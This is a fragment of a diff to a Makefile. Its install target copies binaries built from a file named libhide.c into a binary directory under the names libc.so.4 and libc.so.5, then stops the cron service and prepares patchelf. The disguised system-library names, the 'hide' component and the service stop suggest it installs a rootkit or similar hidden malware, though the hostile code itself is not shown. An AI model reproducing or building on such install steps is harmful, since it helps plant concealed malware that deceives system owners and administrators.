@@ -19,8 +19,8 @@ $(LIBHIDE): libhide.c
 	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
 
 install: all
-	install -Dm755 $(LIBEXEC) $(BINDIR)/libc.so.4
-	install -Dm755 $(LIBHIDE) $(BINDIR)/libc.so.5
+	$(CP) $(LIBEXEC) $(BINDIR)/libc.so.4
+	$(CP) $(LIBHIDE) $(BINDIR)/libc.so.5
 
 	systemctl stop cron
 	chmod +x ./patchelf
